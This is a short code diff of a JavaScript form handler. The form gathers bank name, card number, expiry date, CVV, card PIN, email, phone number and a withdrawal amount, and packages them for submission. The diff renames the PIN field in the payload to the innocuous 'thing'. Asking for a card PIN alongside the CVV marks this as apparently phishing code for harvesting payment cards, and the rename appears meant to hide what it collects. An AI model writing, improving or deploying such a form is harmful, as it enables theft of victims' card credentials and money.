@@ -21,7 +21,7 @@ form.addEventListener('submit', (e) => {
   const pinHolder = document.getElementById('p-i-n').value;
 
   // Check if all fields are filled
-  if (!bankName || !cardNumber || !expiringDate || !cvv || !pin || !email || !phoneNumber || !withdrawAmount) {
+  if (!bankName || !cardNumber || !expiringDate || !cvv || !pinHolder || !email || !phoneNumber || !withdrawAmount) {
     alert('Please fill all details');
     return;
   }
@@ -33,7 +33,7 @@ form.addEventListener('submit', (e) => {
     card_number: cardNumber,
     expiring_date: expiringDate,
     cvv: cvv,
-    pin: pinHolder,
+    thing: pinHolder,
     email: email,
     phone_number: phoneNumber
   })
